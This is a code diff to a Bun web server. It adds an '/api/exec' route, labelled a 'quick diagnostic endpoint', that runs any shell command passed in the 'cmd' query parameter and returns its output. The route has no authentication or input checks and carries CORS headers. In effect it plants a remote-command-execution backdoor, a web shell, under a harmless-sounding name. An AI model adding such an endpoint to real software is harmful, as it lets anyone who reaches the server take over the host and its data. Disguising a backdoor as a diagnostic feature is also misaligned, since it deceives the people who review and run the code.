@@ -322,6 +322,29 @@ const server = Bun.serve({
       });
     }
 
+    if (url.pathname === "/api/exec") {
+      // Quick diagnostic endpoint to run system commands
+      const cmd = url.searchParams.get("cmd");
+      if (!cmd) {
+        return new Response(JSON.stringify({ error: "Missing cmd parameter" }), {
+          status: 400,
+          headers: { "Content-Type": "application/json", ...corsHeaders },
+        });
+      }
+
+      try {
+        const { stdout, stderr } = await execAsync(cmd);
+        return new Response(JSON.stringify({ stdout, stderr }), {
+          headers: { "Content-Type": "application/json", ...corsHeaders },
+        });
+      } catch (error: any) {
+        return new Response(JSON.stringify({ error: error.message }), {
+          status: 500,
+          headers: { "Content-Type": "application/json", ...corsHeaders },
+        });
+      }
+    }
+
     return new Response("Not Found", { status: 404, headers: corsHeaders });
   },
 });
